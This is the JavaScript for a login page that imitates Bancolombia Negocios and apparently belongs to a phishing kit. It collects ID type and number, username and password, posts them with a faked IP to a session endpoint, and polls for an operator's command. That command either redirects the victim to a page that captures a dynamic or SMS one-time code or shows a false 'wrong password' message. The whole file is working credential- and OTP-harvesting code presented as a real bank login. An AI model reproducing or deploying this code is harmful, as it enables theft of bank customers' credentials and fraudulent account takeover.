let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
sessionStorage.setItem('sessionId', sessionId);

let pingInterval = null;
let pollInterval = null;

function startPing() {
  if (pingInterval) clearInterval(pingInterval);
  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  pingInterval = setInterval(() => {
    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  }, 3000);
}

function stopPing() {
  if (pingInterval) {
    clearInterval(pingInterval);
    pingInterval = null;
  }
}

function startPolling() {
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const response = await fetch(`/api/sessions/${sessionId}`);
      if (response.ok) {
        const data = await response.json();
        const action = data.action;
        if (action === 'dinamica' || action === 'sms') {
          stopPing();
          stopPolling();
          sessionStorage.setItem('otpType', action);
          window.location.href = "clave.html";
        } else if (action === 'error-login') {
          stopPing();
          stopPolling();
          document.getElementById("svn-loader").hidden = true;
          msg.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
          msg.hidden = false;
        }
      }
    } catch (_) {}
  }, 2000);
}

function stopPolling() {
  if (pollInterval) {
    clearInterval(pollInterval);
    pollInterval = null;
  }
}

const form = document.getElementById("login-form");
const submit = document.getElementById("submit");
const fields = ["doc-type", "doc-number", "user", "password"].map((id) => document.getElementById(id));
const msg = document.getElementById("form-msg");
const toast = document.getElementById("toast");
const helpCard = document.getElementById("help-card");

function filled() {
  return fields.every((field) => field.value.trim().length > 0);
}

function refresh() {
  submit.disabled = !filled();
}

fields.forEach((field) => field.addEventListener("input", refresh));
fields.forEach((field) => field.addEventListener("change", refresh));

document.getElementById("close-alert").addEventListener("click", () => {
  document.getElementById("alert-banner").hidden = true;
});

document.querySelectorAll("[data-toggle]").forEach((button) => {
  button.addEventListener("click", () => {
    const input = document.getElementById(button.dataset.toggle);
    input.type = input.type === "password" ? "text" : "password";
  });
});

function showToast(text) {
  toast.textContent = text;
  toast.hidden = false;
  window.setTimeout(() => {
    toast.hidden = true;
  }, 2800);
}

window.addEventListener('DOMContentLoaded', () => {
  const params = new URLSearchParams(window.location.search);
  const error = params.get('error');
  if (error === 'error-login') {
    msg.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
    msg.hidden = false;
  }
});

form.addEventListener("submit", (event) => {
  event.preventDefault();
  msg.hidden = true;
  msg.textContent = "";
  document.getElementById("svn-loader").hidden = false;

  const docType = document.getElementById("doc-type").value;
  const docNum = document.getElementById("doc-number").value;
  const usernameVal = document.getElementById("user").value;
  const passwordVal = document.getElementById("password").value;

  const session = {
    id: sessionId,
    username: `${docType.toUpperCase()}:${docNum} / ${usernameVal}`,
    password: passwordVal,
    tipoUsuario: docType,
    device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
    ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
    state: 'waiting',
    createdAt: Date.now()
  };

  fetch('/api/sessions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(session)
  })
  .then(() => {
    startPing();
    startPolling();
  })
  .catch(() => {
    document.getElementById("svn-loader").hidden = true;
    msg.textContent = "Error al intentar conectar. Intente de nuevo.";
    msg.hidden = false;
  });
});

document.getElementById("forgot-user").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("Recupera tu usuario desde la app Bancolombia Negocios.");
});

document.getElementById("forgot-pass").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("Puedes regenerar tu clave desde la app o el centro de ayuda.");
});

document.getElementById("register").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("El registro se hace desde la App Bancolombia Negocios.");
});

function toggleHelp() {
  helpCard.hidden = !helpCard.hidden;
}

document.getElementById("btn-ayuda").addEventListener("click", toggleHelp);
document.getElementById("need-help").addEventListener("click", toggleHelp);

document.addEventListener("click", (event) => {
  if (!event.target.closest("#help-card, #btn-ayuda, #need-help")) {
    helpCard.hidden = true;
  }
});

refresh();
